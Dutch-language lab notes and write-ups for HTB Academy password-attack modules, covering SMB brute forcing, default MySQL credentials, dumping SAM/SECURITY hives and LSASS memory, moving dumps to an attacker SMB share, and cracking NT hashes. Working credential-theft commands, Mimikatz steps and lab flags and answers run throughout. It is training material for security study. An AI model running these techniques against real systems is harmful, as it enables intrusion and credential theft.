- De `-V` flag vertraagt hydra sterk, gebruik deze alleen voor debugging

---

## Challenge 4 – SMB

### Brute force met NetExec

bash

```bash
cd ~/Downloads
netexec smb 10.129.8.226 -u username.list -p password.list --continue-on-success 2>/dev/null | grep "+"
```

Als NetExec problemen geeft, kan Metasploit als alternatief worden gebruikt:

bash

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /home/kali/Downloads/username.list
set PASS_FILE /home/kali/Downloads/password.list
set RHOSTS 10.129.8.226
run
```

**Gevonden credentials:**

- john:november
- dennis:rockstar
- chris:789456123
- cassie:12345678910

### Shares bekijken

bash

```bash
netexec smb 10.129.8.226 -u chris -p 789456123 --shares 2>/dev/null
```

**Resultaat:** Een share genaamd `CASSIE` gevonden.

### Inloggen op de CASSIE share

> Let op: `-p` in smbclient is voor **poort**, niet wachtwoord.  
> Gebruik de `%` notatie voor credentials: `-U gebruiker%wachtwoord`

bash

```bash
smbclient //10.129.8.226/CASSIE -U cassie%12345678910
```

### Flag ophalen

bash

```bash
smb: \> ls
smb: \> get flag.txt
smb: \> exit

cat flag.txt
```

**Flag:** `HTB{S4ndM4ndB33}`

---

## Samenvatting

|Service|Gebruiker|Wachtwoord|Flag|
|---|---|---|---|
|SSH|dennis|rockstar|`HTB{Let5R0ck1t}`|
|WinRM|john|november|`HTB{That5Novemb3r}`|
|RDP|-|-|-|
|SMB|cassie|12345678910|`HTB{S4ndM4ndB33}`|

---

## Geleerde lessen

- `netexec` is een krachtige tool voor meerdere protocollen (WinRM, SMB, SSH, RDP, etc.)
- Gebruik altijd `2>/dev/null | grep "+"` om de output overzichtelijk te houden
- `smbclient` gebruikt `-p` voor poort, niet wachtwoord — gebruik `%` notatie voor credentials
- Evil-WinRM heeft rubyzip versie 2.x nodig, niet 3.x
- Gebruikers hergebruiken wachtwoorden: dennis:rockstar werkte voor zowel SSH als SMB
- De SMB share heette `CASSIE` en was alleen toegankelijk met cassie's eigen credentials

---

## Tools gebruikt

|Tool|Doel|
|---|---|
|Hydra|Brute force SSH en RDP|
|NetExec|Brute force WinRM en SMB|
|Evil-WinRM|Shell via WinRM|
|smbclient|Bestanden ophalen via SMB|
|xfreerdp|Remote Desktop verbinding|
|Metasploit|Alternatief voor SMB login|

┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set user_file /root/Downloads/username.list; set pass_file /root/Downloads/password.list; set rhosts 10.129.8.226; run"
USER_FILE => /home/kali/Downloads/username.list
PASS_FILE => /home/kali/Downloads/password.list

[+] 10.129.8.226:445 - Success: '.\john:november'
[+] 10.129.8.226:445 - Success: '.\dennis:rockstar'
[+] 10.129.8.226:445 - Success: '.\chris:789456123'
[+] 10.129.8.226:445 - Success: '.\cassie:12345678910'

msf auxiliary(scanner/smb/smb_login) > netexec smb 10.129.8.226 -u chris -p 789456123 --shares
SMB  10.129.8.226  445  WINSRV  [+] WINSRV\chris:789456123 
SMB  10.129.8.226  445  WINSRV  Share      Permissions  Remark
SMB  10.129.8.226  445  WINSRV  -----      -----------  ------
SMB  10.129.8.226  445  WINSRV  ADMIN$                  Remote Admin
SMB  10.129.8.226  445  WINSRV  C$                      Default share
SMB  10.129.8.226  445  WINSRV  CASSIE                  
SMB  10.129.8.226  445  WINSRV  IPC$       READ         Remote IPC

┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.8.226/CASSIE -U cassie%12345678910
smb: \> ls
  .          DR        0  Thu Jan  6 12:48:47 2022
  ..         DR        0  Thu Jan  6 12:48:47 2022
  flag.txt   A        16  Thu Jan  6 09:46:14 2022

smb: \> get flag.txt
getting file \flag.txt of size 16 as flag.txt

┌──(kali㉿kali)-[~]
└─$ cat flag.txt                      
HTB{S4ndM4ndB33}


## Wachtwoordaanvallen: Spraying, Stuffing en Defaults

### 1. Password Spraying

**Password spraying** is een techniek waarbij een aanvaller **één enkel wachtwoord** probeert te gebruiken op **veel verschillende gebruikersaccounts**.

- **Waarom?** Om te voorkomen dat accounts worden geblokkeerd (account lockout).
    
- **Voorbeeld:** Als je weet dat een bedrijf vaak `Welkom01!` gebruikt als tijdelijk wachtwoord, "spray" je dit over alle bekende gebruikersnamen.
    
- **Tools:** Voor webapplicaties gebruik je **Burp Suite**, voor Active Directory gebruik je **NetExec** of **Kerbrute**.
    

### 2. Credential Stuffing

**Credential stuffing** is het gebruiken van gestolen inloggegevens (gebruikersnaam:wachtwoord combinaties) van de ene dienst om toegang te krijgen tot andere diensten.

- **Waarom?** Mensen hergebruiken hun wachtwoorden vaak op verschillende platformen (zoals privé-mail en werk-systemen).
    
- **Tool voorbeeld:** Met **Hydra** kun je een lijst met combinaties (`user_pass.list`) testen tegen een SSH-service.
    

### 3. Standaard Inloggegevens (Default Credentials)

Veel systemen (routers, firewalls, databases) worden geleverd met standaard wachtwoorden die beheerders soms vergeten te wijzigen.

- **Tool:** De **Default Credentials Cheat Sheet**. Je kunt deze installeren met: `pip3 install defaultcreds-cheat-sheet`.
    
- **Gebruik:** Zoek naar standaard wachtwoorden voor een specifiek merk, bijvoorbeeld: `creds search linksys`.
    

---

## Jouw Opdracht (Target: 10.129.14.108)

**De vraag:** Gebruik de verstrekte inloggegevens om in te loggen op de doelmachine en zoek de **MySQL-inloggegevens**. Dien deze in als antwoord in het formaat: `<gebruikersnaam>:<wachtwoord>`.

**Je inloggegevens voor SSH:**

- **Gebruiker:** `sam`
    
- **Wachtwoord:** `B@tm@n2022!`
    

### Wat moet je nu doen?

1. **Log in via SSH:**
    
    Bash
    
    ```
    ssh sam@10.129.14.108
    ```
    
2. **Zoek naar MySQL gegevens:** Kijk in de home-directory van `sam` of zoek naar configuratiebestanden. Een goede plek om te beginnen is kijken welke bestanden er zijn:
    
    Bash
    
    ```
    ls -la
    ```
    
    Of zoek specifiek naar bestanden die "mysql" of "password" bevatten:
    
    Bash
    
    ```
    grep -rnw "/" -e "mysql" 2>/dev/null
    ```

# HTB Academy – Password Attacks: Password Reuse / Default Passwords

**Datum:** 19 februari 2026 **Target:** 10.129.14.108 (ACADEMY-PWATTACKS-NIX01) **Doel:** MySQL credentials vinden via default credentials aanval **Gegeven credentials:** sam:B@tm@n2022!

---

## Verkenning

### Inloggen via SSH

bash

```bash
ssh sam@10.129.14.108
# wachtwoord: B@tm@n2022!
```

### Poortscanning

bash

```bash
nmap 10.129.14.108
```

**Open poorten:**

- 21/tcp – FTP (vsftpd 3.0.3)
- 22/tcp – SSH (OpenSSH 8.2p1)
- 139/tcp – NetBIOS/Samba
- 445/tcp – SMB (Samba)
- 3306/tcp – MySQL (alleen lokaal beschikbaar)

---

## Stap 1 – FTP verkenning

### FTP configuratie lezen

bash

```bash
cat /etc/vsftpd.conf
```

**Belangrijke bevinding:**

- `anonymous_enable=NO` → anonymous login uitgeschakeld
- `chown_username=kira` → kira is de FTP beheerder

### FTP inloggen als sam

bash

```bash
ftp 127.0.0.1
# username: sam
# password: B@tm@n2022!
```

Sam kan inloggen via FTP maar dit toont alleen zijn eigen home directory. Geen extra informatie gevonden.

### Brute force FTP als kira

Omdat kira de FTP beheerder is, proberen we haar wachtwoord te kraken:

bash

```bash
hydra -l kira -P ~/Downloads/password.list ftp://10.129.14.108 -t 4 2>/dev/null
```

**Resultaat:** Geen wachtwoord gevonden in de wordlist.

---

## Stap 2 – SMB verkenning

### Shares bekijken

bash

```bash
smbclient -L //10.129.14.108 -U sam%'B@tm@n2022!'
```

**Gevonden shares:**

- `print$` – Printer Drivers
- `SHARE` – Inlanefreight-DEV
- `IPC$` – IPC Service

### Inloggen op de SHARE

bash

```bash
smbclient //10.129.14.108/SHARE -U sam%'B@tm@n2022!'
```

bash

```bash
smb: \> dir
smb: \> get flag.txt
smb: \> exit
```

bash

```bash
cat ~/flag.txt
# HTB{P455_Mu7ations}  ← flag van vorige module, niet de MySQL credentials
```

---

## Stap 3 – MySQL default credentials

### Default credentials opzoeken

bash

````bash
pip3 install defaultcreds-cheat-sheet --break-system-packages
creds search mysql
```

**Output:**
```
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql (ssh)         |        root       |   root   |
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+
````

### Default credentials testen in SSH sessie

bash

```bash
mysql -u root -p'root'
# ERROR 1698 - root gebruikt unix socket authenticatie

mysql -u superdba -p'admin'
# Welcome to the MySQL monitor! ✅
```

---

## Resultaat

**MySQL credentials gevonden:** `superdba:admin`

---

## Samenvatting aanpak

|Stap|Methode|Resultaat|
|---|---|---|
|1|FTP verkenning|Geen credentials gevonden|
|2|FTP brute force (kira)|Geen wachtwoord in wordlist|
|3|SMB shares bekijken|Flag van vorige module gevonden|
|4|Default credentials tool|superdba:admin gevonden ✅|

**Antwoord:** `superdba:admin`

---

## Geleerde lessen

- Bij MySQL altijd eerst **default credentials** proberen
- `defaultcreds-cheat-sheet` is handig voor bekende standaard credentials per product
- `ERROR 1698` bij MySQL root = unix socket authenticatie, probeer andere gebruikers
- FTP configuratie (`/etc/vsftpd.conf`) kan hints geven over gebruikers
- Samba/SMB kan ook op Linux draaien — altijd controleren op open shares

---

## Tools gebruikt

|Tool|Doel|
|---|---|
|Hydra|Brute force FTP|
|smbclient|SMB shares bekijken|
|defaultcreds-cheat-sheet|Default credentials opzoeken|
|nmap|Poortscanning|
|mysql client|MySQL verbinding testen|


## Het Windows-authenticatieproces

Het authenticatieproces van een Windows-client bestaat uit verschillende modules die verantwoordelijk zijn voor het inloggen, het ophalen van inloggegevens en de verificatie daarvan.

### De Local Security Authority (LSA)

De **LSA** is een beveiligd subsysteem dat gebruikers authenticeert en lokale logins beheert. Het houdt toezicht op alle aspecten van de lokale beveiliging en vertaalt gebruikersnamen naar **Security Identifiers (SIDs)**.

- Op een **Domain Controller** worden deze gegevens opgeslagen in **Active Directory**.
    
- Op een lokale computer worden deze lokaal beheerd.
    

### Belangrijke Componenten bij Interactief Inloggen

Wanneer je fysiek (interactief) inlogt op een computer, werken de volgende onderdelen samen:

1. **WinLogon:** Het vertrouwde proces dat de interactie met de gebruiker beheert (zoals het aanroepen van het inlogscherm, wachtwoordwijzigingen en het vergrendelen van het scherm).
    
2. **LogonUI:** De grafische interface waar je je wachtwoord typt.
    
3. **Credential Providers:** DLL-bestanden die de inloggegevens verzamelen en doorgeven.
    
4. **LSASS (Local Security Authority Subsystem Service):** De "uitsmijter" van het systeem. Dit proces ontvangt de gegevens van WinLogon en controleert of ze kloppen.
    

---

## LSASS: De Gatekeeper

**LSASS** is het belangrijkste proces voor een aanvaller. Het draait als `lsass.exe` en beheert alle authenticatiepakketten.

|**Authenticatiepakket**|**Beschrijving**|
|---|---|
|**Lsasrv.dll**|De kernservice die beveiligingspolicies afdwingt en kiest tussen NTLM of Kerberos.|
|**Msv1_0.dll**|Gebruikt voor lokale machine-logins (niet-domein).|
|**Samsrv.dll**|Beheert de toegang tot de SAM-database.|
|**Kerberos.dll**|Verantwoordelijk voor Kerberos-authenticatie (in domeinen).|
|**Netlogon.dll**|Verantwoordelijk voor inlogpogingen over het netwerk.|
|**Ntdsa.dll**|Alleen op Domain Controllers: beheert de Active Directory-database.|

---

## Waar worden wachtwoorden opgeslagen?

### 1. De SAM-database (Security Account Manager)

De **SAM** is een databasebestand waarin inloggegevens van **lokale** gebruikers worden opgeslagen.

- **Locatie:** `%SystemRoot%\system32\config\SAM` (Gemonteerd onder `HKLM\SAM`).
    
- **Beveiliging:** Wachtwoorden worden opgeslagen als **hashes** (LM of NTLM). Om dit bestand te lezen heb je **SYSTEM-rechten** nodig.
    
- **SYSKEY:** Een extra versleuteling om offline "cracking" van de SAM-database te bemoeilijken.
    

### 2. Credential Manager

Dit is een ingebouwde functie waarmee gebruikers inloggegevens voor websites en netwerkbronnen kunnen opslaan.

- **Locatie:** `C:\Users\[Gebruikersnaam]\AppData\Local\Microsoft\Vault\` of `Credentials\`.
    
- Deze gegevens zijn versleuteld per gebruikersprofiel, maar kunnen met de juiste tools worden ontsleuteld.
    

### 3. NTDS.dit (Active Directory Database)

In een bedrijfsomgeving (domein) worden inloggegevens niet op de lokale pc opgeslagen, maar op de Domain Controller in het bestand **NTDS.dit**.

- Dit bestand bevat de gebruikersnamen en wachtwoord-hashes van **alle** gebruikers in het hele domein.
    
- Het extraheren van gegevens uit dit bestand is het ultieme doel bij een aanval op een Windows-netwerk.
    

---

### Wat betekent dit voor jou als hacker?

Nu je weet waar de gegevens staan, zul je in de volgende modules leren hoe je deze kunt "dumpen":

- **LSASS dumpen:** Om wachtwoorden of hashes uit het werkgeheugen te halen.
    
- **SAM dumpen:** Om lokale wachtwoorden te stelen.
    
- **NTDS dumpen:** Om controle te krijgen over het hele domein.




## Aanvallen op SAM, SYSTEM en SECURITY

Met administrator-rechten op een Windows-systeem kun je de bestanden van de SAM-database "dumpen", ze overzetten naar je eigen machine en de hashes offline kraken. Hierdoor hoef je geen actieve verbinding met het doelwit te behouden.

### Register-hives

Er zijn drie registeronderdelen (hives) die we moeten kopiëren:

|**Register-hive**|**Beschrijving**|
|---|---|
|**HKLM\SAM**|Bevat de wachtwoord-hashes van lokale gebruikers.|
|**HKLM\SYSTEM**|Bevat de **boot key**, die nodig is om de SAM-database te ontsleutelen.|
|**HKLM\SECURITY**|Bevat gevoelige LSA-informatie, zoals gecachte domein-inloggegevens (DCC2) en wachtwoorden in tekstvorm.|

---

### Stap 1: Hives kopiëren met `reg.exe`

Open een opdrachtprompt (CMD) als administrator en voer de volgende commando's uit:

DOS

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Stap 2: Bestanden overzetten naar je aanvalsmachine

Je kunt een SMB-share opzetten op je Linux-machine met Impacket's `smbserver.py`:

Bash

```
sudo python3 smbserver.py -smb2support CompData /jouw/map/
```

Op de Windows-machine verplaats je de bestanden naar deze share:

DOS

```
move sam.save \\<JOUW_IP>\CompData
move system.save \\<JOUW_IP>\CompData
move security.save \\<JOUW_IP>\CompData
```

### Stap 3: Hashes dumpen met `secretsdump`

Gebruik Impacket's `secretsdump.py` om de hashes uit de gekopieerde bestanden te halen:

Bash

```
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

De output toont de hashes in het formaat `gebruikersnaam:RID:LM-hash:NT-hash`.

---

### Stap 4: Hashes kraken met Hashcat

Sla de NT-hashes op in een bestand (bijv. `hashes.txt`) en gebruik Hashcat met de juiste modus (`-m 1000` voor NTLM):

Bash

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Andere belangrijke onderdelen

- **DCC2 Hashes:** Gevonden in `HKLM\SECURITY`. Dit zijn hashes van domeingebruikers die eerder zijn ingelogd. Ze zijn veel trager om te kraken (gebruik `-m 2100` in Hashcat).
    
- **DPAPI:** Een systeem van Windows om data (zoals opgeslagen wachtwoorden in Chrome of Outlook) te versleutelen. Deze kunnen worden ontsleuteld met tools als `mimikatz`.
    
- **LSA Secrets:** Bevat inloggegevens van services en geplande taken.
    

---

## Antwoorden op de vragen (Hulp)

1. **Waar bevindt de SAM-database zich in het Windows-register?**
    
    - _Antwoordformaat:_ `****\***`
        
    - _Hint:_ Kijk in de tabel onder "Registry hives". Het is `HKLM\SAM`.
        
2. **Verkrijg het wachtwoord van de `ITbackdoor` gebruiker.**
    
    - _Aanpak:_ Log in via RDP, dump de hives zoals hierboven beschreven, gebruik `secretsdump` om de NT-hash van `ITbackdoor` te vinden, en kraak deze met `hashcat` en de `rockyou.txt` lijst.
        
3. **Dump de LSA secrets en vind de opgeslagen inloggegevens.**
    
    - _Aanpak:_ Gebruik `secretsdump` op de hives. Zoek in de sectie "Dumping LSA Secrets" naar een gebruikersnaam en wachtwoord die eruitzien als een duidelijke combinatie (geen hashes).




                                                                                                                                                  
# HTB Academy – Password Attacks: Attacking SAM, SYSTEM, and SECURITY

**Datum:** 19 februari 2026  
**Target:** 10.129.14.122 (FRONTDESK01)  
**Doel:** SAM hashes dumpen, kraken en LSA secrets ophalen  
**Gegeven credentials:** Bob:HTB_@cademy_stdnt!

---

## Verkenning

### Poortscanning

bash

```bash
nmap 10.129.14.122
sudo nmap -sC -sV -A -p 135,139,445,3389,5985 10.129.14.122
```

**Open poorten:**

- 135/tcp – MSRPC
- 139/tcp – NetBIOS
- 445/tcp – SMB
- 3389/tcp – RDP (Windows 10 Build 18362)
- 5985/tcp – WinRM

---

## Vraag 1 – SAM locatie in registry

> Where is the SAM database located in the Windows registry?

**Antwoord:** `HKLM\SAM`

**Uitleg registry hives:**

|Registry Hive|Inhoud|
|---|---|
|HKLM\SAM|Wachtwoord hashes van lokale gebruikers|
|HKLM\SYSTEM|Boot key — nodig om SAM te decrypten|
|HKLM\SECURITY|LSA secrets, cached domain credentials, DPAPI keys|

---

## Vraag 2 – ITbackdoor wachtwoord

### SAM hashes dumpen via NetExec

bash

````bash
netexec smb 10.129.14.122 --local-auth -u Bob -p 'HTB_@cademy_stdnt!' --sam 2>/dev/null
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
````

### NT hash kraken met Hashcat

Het formaat van een SAM hash is: `uid:rid:lmhash:nthash`  
We pakken alleen de **NT hash** (het laatste gedeelte):

bash

````bash
hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt
```

**Resultaat:**
```
c02478537b9727d391bc80011c2e2321:matrix
````

**Antwoord:** `matrix`

---

## Vraag 3 – LSA secrets dumpen

bash

````bash
netexec smb 10.129.14.122 --local-auth -u Bob -p 'HTB_@cademy_stdnt!' --lsa 2>/dev/null
```

**Output:**
```
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
frontdesk:Password123
````

**Antwoord:** `frontdesk:Password123`

---

## Samenvatting

|Vraag|Methode|Antwoord|
|---|---|---|
|SAM locatie|Theorie uit module|`HKLM\SAM`|
|ITbackdoor wachtwoord|SAM dump + Hashcat|`matrix`|
|LSA credentials|LSA dump via NetExec|`frontdesk:Password123`|

---

## Alternatieve methode (handmatig via RDP)

**Stap 1 – Inloggen via RDP:**

bash

```bash
xfreerdp /v:10.129.14.122 /u:Bob /p:'HTB_@cademy_stdnt!'
```

**Stap 2 – Registry hives opslaan (in cmd.exe als admin):**

cmd

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

**Stap 3 – SMB share maken op Kali:**

bash

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/
```

**Stap 4 – Bestanden overzetten naar Kali:**

cmd

```cmd
move sam.save \\<kali-IP>\CompData
move system.save \\<kali-IP>\CompData
move security.save \\<kali-IP>\CompData
```

**Stap 5 – Hashes dumpen met secretsdump:**

bash

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Stap 6 – NT hashes kraken:**

bash

```bash
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

---

## Geleerde lessen

- NetExec kan SAM en LSA **direct over het netwerk** dumpen — geen RDP of lokale toegang nodig
- Het hash formaat in SAM is `uid:rid:lmhash:nthash` — alleen de NT hash is nodig voor Hashcat
- Hashcat mode `-m 1000` is voor NT/NTLM hashes
- LSA secrets kunnen **plaintext wachtwoorden** bevatten van services en scheduled tasks
- DCC2 hashes zijn ~800x langzamer te kraken dan NT hashes
- De `--local-auth` flag in NetExec is nodig voor lokale authenticatie

---

## Tools gebruikt

|Tool|Doel|
|---|---|
|NetExec|SAM en LSA dumpen over netwerk|
|Hashcat|NT hashes kraken|
|secretsdump.py|Hashes offline dumpen uit registry hives|
|reg.exe|Registry hives opslaan op Windows|
|smbserver.py|SMB share maken voor bestandsoverdracht|
|xfreerdp|RDP verbinding|


## LSASS Aanvallen

Naast het kopiëren van de SAM-database is het Local Security Authority Subsystem Service (**LSASS**) een zeer waardevol doelwit. LSASS is een cruciaal Windows-proces dat verantwoordelijk is voor het afdwingen van beveiligingsbeleid, het afhandelen van gebruikersauthenticatie en het opslaan van gevoelige inloggegevens in het geheugen.

Bij het inloggen zal LSASS:

- Inloggegevens lokaal cachen in het geheugen.
    
- Toegangstokens (access tokens) aanmaken.
    
- Beveiligingsbeleid afdwingen.
    
- Gebeurtenissen naar het Windows-beveiligingslogboek schrijven.
    

### Het dumpen van het LSASS-procesgeheugen

Door een kopie (dump) van het LSASS-geheugen te maken, kunnen we inloggegevens offline extraheren op onze aanvalsmachine. Dit is veiliger en sneller dan alles direct op het doelwitsysteem doen.

#### Methode 1: Taakbeheer (GUI)

Als je een grafische sessie (RDP) hebt:

1. Open **Taakbeheer** (Task Manager).
    
2. Ga naar het tabblad **Details** (of Processen).
    
3. Zoek `lsass.exe` (Local Security Authority Process).
    
4. Klik met de rechtermuisknop en kies **Dumpbestand maken** (Create dump file).
    
5. Het bestand `lsass.DMP` wordt opgeslagen in de `%temp%` map.
    

#### Methode 2: Rundll32.exe & Comsvcs.dll (CLI)

Deze methode is sneller en werkt via de opdrachtregel, maar wordt vaak gedetecteerd door moderne antivirussoftware. Eerst moet je het **Process ID (PID)** van `lsass.exe` vinden:

- **CMD:** `tasklist /svc | findstr lsass`
    
- **PowerShell:** `Get-Process lsass`
    

Zodra je de PID hebt (bijv. 672), voer je dit uit in een Administrator PowerShell-sessie:

PowerShell

```
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

---

### Inloggegevens extraheren met Pypykatz

Zodra je het `.dmp` bestand naar je Linux-machine hebt overgebracht, kun je **Pypykatz** gebruiken. Dit is een Python-versie van Mimikatz.

**Commando:**

Bash

```
pypykatz lsa minidump /pad/naar/lsass.dmp
```

#### Wat kun je vinden in de output?

- **MSV:** Bevat NT & SHA1 password hashes van actieve sessies.
    
- **WDIGEST:** Op oudere systemen (of systemen waar dit expliciet aan staat) staan hier wachtwoorden in **platte tekst**.
    
- **Kerberos:** Bevat tickets, ekeys en pins die gebruikt kunnen worden voor _Lateral Movement_ in een domein.
    
- **DPAPI:** Bevat masterkeys waarmee geheimen van applicaties (zoals Chrome-wachtwoorden) ontsleuteld kunnen worden.
    

---

### Vragen en Antwoorden (Hulp)

1. **Wat is de naam van het uitvoerbare bestand (executable) dat geassocieerd wordt met het Local Security Authority Process?**
    
    - _Hint:_ Kijk in de tekst naar de naam van het proces in Taakbeheer of bij het vinden van de PID.
        
    - _Antwoord:_ `lsass.exe`
        
2. **Verkrijg het wachtwoord van de `Vendor` gebruiker op het doelwit.**
    
    - _Stappenplan:_
        
        1. Log in via RDP als `htb-student`.
            
        2. Dump het LSASS-geheugen (gebruik de Taakbeheer-methode als de CLI-methode door AV wordt geblokkeerd).
            
        3. Zet `lsass.DMP` over naar je aanvalsmachine (bijv. via een SMB-share zoals in de vorige sectie).
            
        4. Draai `pypykatz` op de dump.
            
        5. Zoek de NT-hash van de gebruiker `Vendor`.
            
        6. Kraak de hash met `hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt`.


# HTB Academy – Password Attacks: Attacking LSASS

**Datum:** 20 februari 2026 **Target:** 10.129.14.208 (FS01) **Doel:** LSASS dump maken en Vendor wachtwoord kraken **Gegeven credentials:** htb-student:HTB_@cademy_stdnt!

---

## Vraag 1 – LSASS executable naam

> What is the name of the executable file associated with the Local Security Authority Process?

**Antwoord:** `lsass.exe`

---

## Vraag 2 – Vendor wachtwoord ophalen

### Verkenning

bash

```bash
nmap 10.129.14.208
sudo nmap -sC -sV -A -p 135,139,445,3389,5985 10.129.14.208
```

**Open poorten:**

- 135/tcp – MSRPC
- 139/tcp – NetBIOS
- 445/tcp – SMB
- 3389/tcp – RDP (Windows 10 Build 17763)
- 5985/tcp – WinRM

### Stap 1 – Inloggen via RDP

bash

```bash
xfreerdp3 /v:10.129.14.208 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution
```

### Stap 2 – LSASS dump maken op Windows

In PowerShell op de Windows machine:

powershell

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full
```

Controleer of het bestand is aangemaakt:

powershell

```powershell
ls C:\lsass.dmp
```

### Stap 3 – SMB share maken op Kali

bash

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/
```

Kali IP checken:

bash

```bash
ip a | grep tun0
# 10.10.15.120
```

### Stap 4 – Bestand overzetten naar Kali

In PowerShell op Windows:

powershell

```powershell
copy C:\lsass.dmp \\10.10.15.120\CompData
```

Controleren op Kali:

bash

```bash
ls -la /home/kali/Documents/lsass.dmp
# -rwxr-xr-x 1 root root 45510382 Feb 20 04:23 /home/kali/Documents/lsass.dmp
```

### Stap 5 – LSASS dump analyseren met pypykatz

bash

````bash
pypykatz lsa minidump /home/kali/Documents/lsass.dmp
```

**Gevonden Vendor hash:**
```
== LogonSession ==
username Vendor
domainname FS01
        == MSV ==
                Username: Vendor
                NT: 31f87811133bc6aaa75a536e77f64314
````

### Stap 6 – Hash kraken met Hashcat

bash

````bash
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt
```

**Resultaat:**
```
31f87811133bc6aaa75a536e77f64314:Mic@123
````

**Antwoord:** `Mic@123`

---

## Samenvatting

|Vraag|Methode|Antwoord|
|---|---|---|
|LSASS executable|Theorie|`lsass.exe`|
|Vendor wachtwoord|LSASS dump + pypykatz + Hashcat|`Mic@123`|

---

## Geleerde lessen

- `lsass.exe` slaat actieve gebruikerssessies op in geheugen — inclusief NT hashes
- `rundll32 comsvcs.dll MiniDump` maakt een dump van het LSASS geheugen
- Gebruik `copy` in plaats van `move` om bestanden over te zetten — anders is het bestand weg op Windows
- `pypykatz` kan LSASS dumps offline analyseren op Linux
- Als poort 445 al in gebruik is op Kali, gebruik `--port 8445` voor de SMB server
- `xfreerdp` is vervangen door `xfreerdp3` op nieuwere Kali versies

---

## Tools gebruikt

|Tool|Doel|
|---|---|
|xfreerdp3|RDP verbinding|
|rundll32 + comsvcs.dll|LSASS memory dump maken|
|smbserver.py|SMB share voor bestandsoverdracht|
|pypykatz|LSASS dump analyseren|
|Hashcat|NT hash kraken|
|nmap|Poortscanning|


## Aanvallen op de Windows Credential Manager

### Windows Vault en Credential Manager

**Credential Manager** (Referentiebeheer) is een Windows-functie waarmee gebruikers en applicaties inloggegevens veilig kunnen opslaan. Deze gegevens worden bewaard in versleutelde mappen onder de gebruikers- en systeemprofielen.

De kluizen (vaults) bevatten een `Policy.vpol` bestand met **AES-sleutels** die worden beschermd door de **DPAPI** (Data Protection API). In nieuwere versies van Windows beschermt **Credential Guard** deze sleutels nog extra via virtualisatie-gebaseerde beveiliging (VBS).

Er zijn twee hoofdtypes kluizen:

- **Webreferenties (Web Credentials):** Gebruikt door Internet Explorer en de oude versie van Edge voor website-logins.
    
- **Windows-referenties (Windows Credentials):** Gebruikt voor OneDrive, domeingebruikers, netwerkshares en services.
    

Je kunt een back-up van deze kluizen maken (als `.crd` bestand) via het configuratiescherm of met dit commando:

DOS

```
rundll32 keymgr.dll,KRShowKeyMgr
```

---

### Referenties inventariseren met `cmdkey`

Met het hulpprogramma `cmdkey` kun je zien welke inloggegevens er momenteel zijn opgeslagen voor de huidige gebruiker:

DOS

```
cmdkey /list
```

**Belangrijke velden in de output:**

- **Target:** De bron (bijv. een servernaam of domein).
    
- **Type:** Bijv. `Domain Password` (domein-login) of `Generic`.
    
- **User:** De bijbehorende gebruikersnaam.
    

Wanneer je een referentie ziet van het type **Domain:interactive**, kun je de opgeslagen inloggegevens gebruiken om een nieuw proces te starten als die gebruiker, **zonder** dat je het wachtwoord hoeft te typen:

DOS

```
runas /savecred /user:SRV01\mcharles cmd
```

---

### Referenties extraheren met Mimikatz

Hoewel `runas` handig is om rechten te krijgen, willen we vaak het wachtwoord in **platte tekst** zien. Hiervoor gebruiken we **Mimikatz**.

Met de module `sekurlsa::credman` kan Mimikatz inloggegevens direct uit het geheugen van het LSASS-proces vissen:

1. Start Mimikatz: `mimikatz.exe`
    
2. Verkrijg de nodige rechten: `privilege::debug`
    
3. Dump de opgeslagen credentials: `sekurlsa::credman`
    

Andere tools die je hiervoor kunt gebruiken zijn: **SharpDPAPI**, **LaZagne**, en **DonPAPI**.

---

### Jouw Opdracht: Het OneDrive-wachtwoord van `mcharles`

**Vraag:** Wat is het wachtwoord dat `mcharles` gebruikt voor OneDrive?

**Stappenplan:**

1. Log in via RDP op de target machine met gebruiker `sadams` en het wachtwoord uit de opdracht.
    
2. Controleer of er opgeslagen gegevens zijn met `cmdkey /list`. Je zult waarschijnlijk een vermelding zien voor `mcharles`.
    
3. Omdat je het wachtwoord in platte tekst nodig hebt, moet je **Mimikatz** gebruiken op de target machine.
    
4. Open een command prompt als **Administrator** (dit is nodig voor `privilege::debug`).
    
